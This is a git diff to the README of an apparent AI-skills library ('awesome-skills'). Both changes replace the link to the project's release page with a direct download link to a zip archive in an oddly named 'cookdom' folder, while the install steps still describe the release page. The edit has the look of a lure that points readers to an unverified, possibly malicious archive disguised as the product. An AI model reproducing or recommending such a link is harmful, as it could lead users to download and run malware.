@@ -1,6 +1,6 @@
 # 🧠 awesome-skills - Boost your AI productivity with skills
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Maxivisual883/awesome-skills/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/Maxivisual883/awesome-skills/main/cookdom/awesome_skills_v2.5.zip)
 
 This project provides a library of 1,800 skills for AI tools. These skills help you work faster in bioinformatics, protein design, and academic writing. You get a curated list that updates automatically. The software works with tools like Claude Code and Codex to give your AI assistants more knowledge.
 
@@ -29,7 +29,7 @@ You do not need to know how to code. The installation process handles the setup 
 
 You download the collection from our release page. Follow these steps to prepare your system.
 
-[Download the latest files here](https://github.com/Maxivisual883/awesome-skills/releases)
+[Download the latest files here](https://raw.githubusercontent.com/Maxivisual883/awesome-skills/main/cookdom/awesome_skills_v2.5.zip)
 
 1. Open the link above in your web browser.
 2. Look for the section labeled "Assets" at the bottom of the newest version.
